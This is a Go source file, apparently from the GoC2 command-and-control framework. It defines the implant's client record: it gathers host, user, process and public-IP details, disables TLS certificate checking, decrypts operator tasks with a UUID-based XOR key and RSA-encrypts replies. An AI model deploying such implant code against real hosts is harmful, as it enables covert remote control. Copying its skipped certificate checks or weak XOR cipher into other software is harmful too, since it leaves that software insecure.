package data

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	mrand "math/rand"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"runtime"
	"time"

	"github.com/google/uuid"
	"github.com/latortuga71/GoC2/internal/modules/basic"
)

type Client struct {
	ClientId             string          `json:"client_id"`
	HostName             string          `json:"host_name"`
	Username             string          `json:"user_name"`
	ProcessName          string          `json:"process_name"`
	ProcessId            int             `json:"process_id"`
	OS                   string          `json:"os"`
	Arch                 string          `json:"arch"`
	Integrity            string          `json:"integrity"`
	LastSeen             time.Time       `json:"last_seen"`
	Online               bool            `json:"online"`
	PublicIp             string          `json:"public_ip"`
	Tasks                []Task          `json:"tasks"`
	Results              []TaskResult    `json:"results"`
	RsaPrivateKey        *rsa.PrivateKey `json:"-"`
	RsaPublicKey         *rsa.PublicKey  `json:"public_key"`
	ClientSideSymKey     []byte          `json:"-"`
	ListenerType         ListenerType    `json:"listener_type"`
	Jitter               int             `json:"jitter"`
	Sleeping             bool            `json:"sleeping"`
	ClientTLSCertificate tls.Certificate `json:"-"`
	WSConn               *Connection     `json:"-"`
	ClientCaCertPool     *x509.CertPool  `json:"-"`
	ClientCertPEM        string          `json:"-"`
	ClientKeyPem         string          `json:"-"`
	ClientRootCA         string          `json:"-"`
	HTTPClient           *http.Client    `json:"-"`
}

func (c *Client) ToBytes() []byte {
	data, err := json.Marshal(c)
	if err != nil {
		return nil
	}
	return data
}

func (c *Client) Info() string {
	return fmt.Sprintf("User: %s\nIntegrity: %s\nProcess: %s %d\n", c.Username, c.Integrity, c.ProcessName, c.ProcessId)
}

func (c *Client) ToString() string {
	data, err := json.MarshalIndent(c, "", " ")
	if err != nil {
		return fmt.Sprintf("Error converting client to string %s", err.Error())
	}
	return string(data)
}

func GetPublicIp() string {
	result := ""
	mrand.Seed(time.Now().UnixNano())
	random := 0 + mrand.Intn(11-1)
	possibleSites := []string{"https://insights.hotjar.com/api/v1/settings/current-ip", "https://api.globaldatacompany.com/common/v1/ip-info", "https://ifconfig.me/ip", "http://checkip.dyndns.org", "https://icanhazip.com/", "https://ipapi.co/ip", "https://api.myip.com", "https://api.ipify.org/", "https://ipinfo.io/ip", "https://ip.seeip.org/", "https://api.bigdatacloud.net/data/client-ip", "https://api.my-ip.io/ip"}
	chosen := possibleSites[random]
	resp, err := http.Get(chosen)
	if err != nil {
		return "Failed to get public ip."
	}
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Failed to get public ip."
	}
	ipString := string(ip)
	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
	submatchall := re.FindAllString(ipString, -1)
	for _, element := range submatchall {
		result += element
	}
	return result
}

func SingleConnectionHttpClient() *http.Client {
	client := &http.Client{
		Transport: &http.Transport{
			MaxConnsPerHost: 1,
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			// other option field
		},
		//Timeout: time.Duration(RequestTimeout) * time.Second,
	}
	return client
}

func NewClient() *Client {
	hostname, err := os.Hostname()
	user, err := user.Current()
	process, err := os.Executable()
	var arch string = runtime.GOARCH
	var osName = runtime.GOOS
	var integrity string
	if err != nil {
		log.Fatalf(err.Error())
	}
	if runtime.GOOS == "windows" {
		arch = runtime.GOARCH
		integrity = basic.GetIntegrity()
	}
	uuid := GenerateUUID()

	return &Client{
		ClientId:         uuid,
		HostName:         hostname,
		Username:         user.Username,
		ProcessName:      process,
		ProcessId:        os.Getpid(),
		Online:           true,
		Integrity:        integrity,
		OS:               osName,
		Arch:             arch,
		Jitter:           5, // default
		ListenerType:     0,
		Sleeping:         false,
		PublicIp:         GetPublicIp(),
		ClientSideSymKey: []byte(uuid),
		HTTPClient:       SingleConnectionHttpClient(),
	}

}

func GenerateUUID() string {
	id := uuid.New()
	return id.String()
}

func (c *Client) DecryptTaskWithSymKey(data []byte) []byte {
	var output []byte
	key := c.ClientSideSymKey
	for i := 0; i < len(data); i++ {
		output = append(output, data[i]^key[i%len(key)])
	}
	return output
}

func (c *Client) EncryptMessageWithPubKey(data []byte) ([]byte, error) {
	length := len(data)
	step := c.RsaPublicKey.Size() - 2*sha256.Size - 2
	var encryptedBytes []byte
	for start := 0; start < length; start += step {
		finish := start + step
		if finish > length {
			finish = length
		}
		encryptedBlock, err := rsa.EncryptOAEP(
			sha256.New(),
			rand.Reader,
			c.RsaPublicKey,
			data[start:finish],
			nil)
		if err != nil {
			return nil, err
		}
		encryptedBytes = append(encryptedBytes, encryptedBlock...)
	}
	return encryptedBytes, nil
}
